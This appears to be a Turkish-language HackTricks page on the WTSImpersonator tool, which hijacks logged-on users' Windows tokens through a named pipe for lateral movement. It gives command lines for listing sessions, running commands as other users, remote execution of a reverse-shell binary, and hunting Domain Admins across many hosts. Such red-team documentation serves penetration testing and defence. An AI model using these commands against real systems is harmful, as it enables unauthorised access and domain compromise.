{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**WTS Impersonator** aracı, **"\\pipe\LSM_API_service"** RPC İsimli borusunu kullanarak, oturum açmış kullanıcıları gizlice listeleyip, geleneksel Token Taklit tekniklerini atlayarak onların token'larını ele geçirir. Bu yaklaşım, ağlar içinde sorunsuz yan hareketler sağlamaktadır. Bu tekniğin yeniliği **Omri Baso'ya atfedilmektedir; çalışmaları [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinden erişilebilir. 

### Temel İşlevsellik
Araç, bir dizi API çağrısı aracılığıyla çalışır:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ana Modüller ve Kullanım
- **Kullanıcıları Listeleme**: Araç ile yerel ve uzaktan kullanıcı listeleme mümkündür, her senaryo için komutlar kullanarak:
- Yerel:
```powershell
.\WTSImpersonator.exe -m enum
```
- Uzak, bir IP adresi veya ana bilgisayar adı belirterek:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komutları Çalıştırma**: `exec` ve `exec-remote` modülleri çalışmak için bir **Hizmet** bağlamına ihtiyaç duyar. Yerel yürütme, sadece WTSImpersonator çalıştırılabilir dosyasını ve bir komutu gerektirir:
- Yerel komut yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Hizmet bağlamı elde etmek için PsExec64.exe kullanılabilir:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Uzak Komut Yürütme**: PsExec.exe'ye benzer şekilde uzaktan bir hizmet oluşturmayı ve yüklemeyi içerir, uygun izinlerle yürütmeye olanak tanır.
- Uzak yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Kullanıcı Avlama Modülü**: Birden fazla makinede belirli kullanıcıları hedef alır, onların kimlik bilgileri altında kod yürütür. Bu, birden fazla sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedef almak için özellikle faydalıdır.
- Kullanım örneği:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/KULLANICI -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```


{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**

</details>
{% endhint %}
